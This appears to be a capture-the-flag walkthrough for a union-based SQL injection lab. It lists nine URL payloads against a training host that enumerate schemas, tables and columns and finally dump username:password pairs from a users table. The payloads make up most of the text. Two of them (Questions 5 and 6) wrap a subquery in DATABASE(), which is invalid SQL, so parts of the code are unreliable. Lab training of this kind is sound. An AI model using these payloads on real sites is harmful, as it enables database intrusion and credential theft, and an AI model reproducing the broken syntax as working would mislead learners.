# Union Based SQL Injection

### SQL Challenges
**Question 1:** Try and show article id 2 by changing the logic of the query.
```
https://50998km2.eu2.ctfio.com/article?id=0' OR id='2
```
```sql
-- Bypass restrictions
SELECT * FROM articles WHERE released=1 AND id=0'' OR id='2'
```

**Question 2:** Use the UNION command to work out how many rows should be returned.
```sql
-- Determine how many columns
https://50998km2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,4;--
```

**Question 3:** Using the previous command swap column 4 to the word hello to show characters can also be returned.
```sql
https://50998km2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,'hello';--
```

**Question 4:** Use the built in DATABASE() function to return the current database data
```sql
-- Extract current database name
https://50998km2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,DATABASE();--
```

**Question 5:** Utilise the information_schema database to extract structural information. Starting with the SCHEMATA table and the SCHEMA_NAME column. Use GROUP_CONCAT to return all results in one row.
```sql
-- Extract all database
https://50998km2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,DATABASE(SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA);--
```

**Question 6:** Now we know the name of the databases we can extract a list of all of the tables from information.TABLES using the TABLE_NAME column.
```sql
-- Extract all database tables
https://50998km2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,DATABASE(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='sqli_two');--
```

**Question 7:** The last step of understanding the database structure is to find all the column names in the table users we can do this from the information_schema.COLUMNS table extracting the COLUMN_NAME column.
```sql
-- Extract all column names
https://50998km2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users');--
```

**Question 8:** Now we know the whole structure we can query users table to extract the username and password columns for one user.
```sql
-- Extract user data
https://50998km2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,username,password from users;--
```

**Question 9:** select * from articles where released=1 and id='0' UNION SELECT 1,2,3,GROUP_CONCAT( concat(username,':',password) ) from users;--'
```sql
https://50998km2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,GROUP_CONCAT(CONCAT(username,':',password) ) FROM users;--'
```

---

**SQL Lab:** https://app.hackinghub.io/hubs/interactive-sqli-union
